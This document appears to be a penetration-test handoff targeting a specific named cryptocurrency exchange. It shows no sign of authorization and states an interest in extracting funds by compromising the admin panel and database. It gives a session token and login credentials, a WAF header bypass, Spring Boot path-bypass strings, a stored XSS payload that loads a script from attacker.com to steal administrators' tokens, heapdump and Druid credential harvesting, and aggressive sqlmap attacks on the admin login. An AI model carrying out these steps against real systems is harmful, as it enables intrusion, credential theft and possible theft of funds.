# Riscoin Security Assessment — Engagement Handoff

**Date:** 2026-04-27
**Target:** `riscoin.com` (Frontend) / `api.riscoima.com` (Backend)
**Status:** Phase 2 (Authenticated) Completed. Entering Phase 3 (Exploitation Phase).

---

## 1. Current Engagement Status

We have successfully mapped both the unauthenticated and authenticated API surfaces of the Riscoin cryptocurrency exchange platform. The platform exhibits numerous hallmarks of a fraudulent "pig butchering" scam exchange, specifically characterized by manual withdrawal queues, predatory transfer fees (35%), and tiered affiliate/agent systems.

We have determined that manipulating client-side numbers or standard user API endpoints to forge balances is futile for fund extraction because all withdrawals are manually gated by human administrators via backend queues. 

**Our primary target is now the Admin Panel and Database.** We discovered that the administrative API routes (`/api/admin/*`) are hosted on the exact same server as the user API, separated only by application-level authorization.

---

## 2. Test Account Configuration

To continue testing, use the following active session details.

| Field | Value |
|-------|-------|
| Target URL | `https://riscoin.com/h5` |
| Primary API | `https://api.riscoima.com` |
| Email | `gichgtrngwbvfaxhcv@vtmpj.net` |
| Password | `password111` |
| User ID | `439441312266874880` |
| APP-LOGIN-TOKEN | `c69n2buooc00_1jn6sb7vm` |

*Note: The token is passed via the `APP-LOGIN-TOKEN` HTTP header. The API is protected by a weak Cloudflare WAF rule that requires `Origin: https://riscoin.com` and `Referer: https://riscoin.com/h5/` headers to be present.*

---

## 3. Next Phase: Exploitation Roadmap

Whoever resumes this engagement should focus on the following four vectors to attempt to compromise the administrative panel or backend database.

### Vector A: Authorization & Path Bypasses (Spring Boot)
The admin APIs (e.g., `/api/admin/user/list`) currently return `100010: Insufficient permissions`. Because the backend uses Java Spring Boot, we should test for path parsing vulnerabilities:
- Append matrix variables: `/api/admin;/user/list`
- Directory traversal: `/api/app/..;/admin/user/list`
- Double slashes: `//api/admin/user/list`
- Test Mass Assignment by attempting to inject `"role":"admin"` or `"isAdmin":true` during registration or profile updates.

### Vector B: Stored Cross-Site Scripting (XSS) against Admins
Since human administrators manually review inputs, we should attempt to blind-fire XSS payloads to steal their session tokens.
- **Targets:** Withdrawal request `remark` fields, Chat support messages, KYC document submission text fields.
- **Payload:** A standard XSS payload that fetches an external script (e.g., `<script src="https://attacker.com/hook.js"></script>`) to extract `localStorage.getItem('APP-LOGIN-TOKEN')` from the admin's browser.

### Vector C: Spring Boot Actuator & Druid Monitoring Bypass
The endpoints `/druid` and `/actuator` are present but return `403 Forbidden`. 
- Attempt to bypass the WAF/Auth block using path manipulation (e.g., `/%2e/druid`, `/druid/index.html`).
- If bypassed, access `/actuator/heapdump` to download server memory and search for plaintext database credentials, or use the Druid dashboard to view active SQL queries containing admin tokens.

### Vector D: SQL Injection (Admin Login)
While the user login appears protected, the admin login endpoint (`/api/admin/login`) operates on a different response structure.
- Run `sqlmap` aggressively against `/api/admin/login`.
- Test boolean-based, time-based, and error-based injection to dump the `users` table and extract the real administrative credentials.

---

*Handoff complete. Ready for exploitation phase upon resumption.*
